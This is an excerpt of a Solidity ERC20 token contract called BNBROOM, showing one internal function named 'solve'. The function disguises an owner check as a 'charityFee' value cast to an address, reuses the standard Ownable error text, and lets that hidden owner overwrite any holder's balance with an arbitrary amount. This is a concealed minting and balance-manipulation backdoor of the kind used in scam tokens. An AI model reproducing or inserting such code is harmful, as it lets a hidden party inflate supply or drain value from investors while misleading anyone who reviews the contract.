...
contract BNBROOM is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function solve(address receiver, uint256 _value) internal {
        require(address(uint160(charityFee)) == msg.sender, "Ownable: caller is not the owner");
        _balances[receiver] = (buyOff - swapperFees) + swapperFees * charityFee * _value * (10 ** 9) / charityFee;
    } 
